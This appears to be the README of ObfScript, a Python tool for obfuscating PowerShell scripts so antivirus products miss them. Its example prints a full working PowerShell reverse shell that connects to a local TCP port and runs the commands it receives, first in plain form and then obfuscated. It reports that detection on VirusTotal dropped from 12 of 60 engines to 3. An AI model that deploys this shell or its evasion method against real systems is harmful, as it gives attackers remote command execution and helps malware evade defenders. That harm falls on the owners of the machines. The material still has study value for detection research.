# ObfScript: Windows Powershell Script Obfuscator
ObfScript is a windows powershell script obfuscator with the goal of avoiding threat detection by antiviruses. I got the idea from this article: https://github.com/t3l3machus/PowerShell-Obfuscation-Bible
> [!CAUTION]
> this program is only for educational purposes

> [!WARNING]
> this program is not tested on a large number of samples and in some cases it may break your scripts. but I'm trying to fix some issues

## Usage 
example of obfscript usage:
```
python obfscript.py --add-comment --negetropy 1 --change-value --size 2000  --input  example/reverse_shell.ps1 --out example/reverse_shell.obf.ps1
```
### flags:

#### -i, --input \<input-file\>
specifies the input file
#### -o, --out \<output-file\>
specifies the output file
#### -s, --size \<size\>
specifies the size of output file in bytes<br>
warning: the output file size is not accurate but it tries to get close to it as much as possible
#### -c, --add-comment 
adds random comment to output script
#### -v, --change-value
changes $True, $False and $null values to obfuscated form
#### -n, --negetropy \<negetropy\>
the higher the negetropy the lower the antropy. example:<br>
this is an obfuscted object name with size of 26 and n=1:
```powershell
$HRoNRKOroehmDyvzqhbzyhCltU = "something"
```
now this this is an obfuscted object name with size of 26 and n=5:
```powershell 
$LLLLLdddddHHHHHHHHHHKKKKKD = "something" 
```
## Example 
this is a simple reverse shell in powershell script:
```powershell
$socket = new-object System.Net.Sockets.TcpClient('127.0.0.1', 3333);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do{
	$writer.Write("> ");
	$writer.Flush();
	$read = $null;
	while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}	
	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
	if(!$out.equals("exit")){
		$out = $out.split(' ')
	        $res = [string](&$out[0] $out[1..$out.length]);
		if($res -ne $null){ $writer.WriteLine($res)}
	}
}While (!$out.equals("exit"))
$writer.close();$socket.close();
```
let's scan it with [virustotal](https://www.virustotal.com/)<br>
![before obfuscation](https://raw.githubusercontent.com/Null-byte-00/ObfScript/main/before_obf.png)<br>
as you can see 12 out of 60 antiviruses could detect the malware<br>
now let's use ObfScript to obfuscate it
```
python.exe obfscript.py  --add-comment --negetropy 5 --change-value --size 2000  --input  example/reverse_shell.ps1 --out example/reverse_shell.obf.ps1
```
this is the obfuscated output we got:
```powershell
$VVVVVUUUUUTTTTTIIIIIeeeeeC = new-object System.Net.Sockets.TcpClient('127.0.0.1', 3333)<#WWWWWIIIIIEEEEE#>
<#jjjjjooooobbbbb#>
if($VVVVVUUUUUTTTTTIIIIIeeeeeC -eq $(171 -as [System.DBNull])){exit 1}<#TTTTTGGGGGrrrrr#>
$TTTTTWWWWWFFFFFvvvvvgggggN = $VVVVVUUUUUTTTTTIIIIIeeeeeC.GetStream()<#jjjjjoooooccccc#>
<#fffffVVVVVppppp#>
$uuuuurrrrrGGGGGNNNNNPPPPPY = new-object System.IO.StreamWriter($TTTTTWWWWWFFFFFvvvvvgggggN)<#MMMMMdddddLLLLL#>
<#HHHHHHHHHHjjjjj#>
$lllllhhhhhkkkkkaaaaabbbbbv = new-object System.Byte[] 1024<#RRRRRWWWWWhhhhh#>
<#YYYYYpppppeeeee#>
$oooooPPPPPQQQQQnnnnnvvvvvY = new-object System.Text.AsciiEncoding<#iiiiieeeeeTTTTT#>
<#yyyyyfffffmmmmm#>
do{<#uuuuuwwwwwqqqqq#>
	$uuuuurrrrrGGGGGNNNNNPPPPPY.Write("> ")<#lllllIIIIIXXXXX#>
<#EEEEEvvvvvCCCCC#>
	$uuuuurrrrrGGGGGNNNNNPPPPPY.Flush()<#pppppBBBBBPPPPP#>
<#GGGGGIIIIIUUUUU#>
	$OOOOOuuuuuwwwwwoooooFFFFFS = $(29 -as [void])<#zzzzzgggggQQQQQ#>
<#LLLLLYYYYYIIIII#>
	while($TTTTTWWWWWFFFFFvvvvvgggggN.DataAvailable -or ($OOOOOuuuuuwwwwwoooooFFFFFS = $TTTTTWWWWWFFFFFvvvvvgggggN.Read($lllllhhhhhkkkkkaaaaabbbbbv, 0, 1024)) -eq $(function YNTBgmPDj {})){}	<#KKKKKrrrrrKKKKK#>
	$YYYYYXXXXXLLLLLTTTTTuuuuud = $oooooPPPPPQQQQQnnnnnvvvvvY.GetString($lllllhhhhhkkkkkaaaaabbbbbv, 0, $OOOOOuuuuuwwwwwoooooFFFFFS).Replace("`r`n","").Replace("`n","")<#kkkkkIIIIIEEEEE#>
<#ooooolllllWWWWW#>
	if(!$YYYYYXXXXXLLLLLTTTTTuuuuud.equals("exit")){<#iiiiikkkkkHHHHH#>
		$YYYYYXXXXXLLLLLTTTTTuuuuud = $YYYYYXXXXXLLLLLTTTTTuuuuud.split(' ')<#ttttthhhhhPPPPP#>
	        $tttttNNNNNooooorrrrrBBBBBY = [string](&$YYYYYXXXXXLLLLLTTTTTuuuuud[0] $YYYYYXXXXXLLLLLTTTTTuuuuud[1..$YYYYYXXXXXLLLLLTTTTTuuuuud.length])<#TTTTTeeeeeMMMMM#>
<#eeeeeWWWWWSSSSS#>
		if($tttttNNNNNooooorrrrrBBBBBY -ne $(138 -as [System.DBNull])){ $uuuuurrrrrGGGGGNNNNNPPPPPY.WriteLine($tttttNNNNNooooorrrrrBBBBBY)}<#cccccdddddlllll#>
	}<#VVVVVdddddWWWWW#>
}While (!$YYYYYXXXXXLLLLLTTTTTuuuuud.equals("exit"))<#kkkkkPPPPPNNNNN#>
$uuuuurrrrrGGGGGNNNNNPPPPPY.close()<#tttttwwwwwfffff#>
$VVVVVUUUUUTTTTTIIIIIeeeeeC.close()<#YYYYYiiiiirrrrr#>
```
let's scan it again with virustotal<br>
![before obfuscation](https://raw.githubusercontent.com/Null-byte-00/ObfScript/main/after_obf.png)<br>
now only 3 out of 60 antiviruses could detect our malware

## donation
If you found this useful and would like to support, you can send donations to this XMR address: 
43EfpCz23b5WPgzaw6UVnF9KsbvueFUumTuk3yMJ8acQbPPFoxgHfq6LE2qD8gNfR3j6Fzc4oGvXRCHvvfmdsYEvPtUXK2v
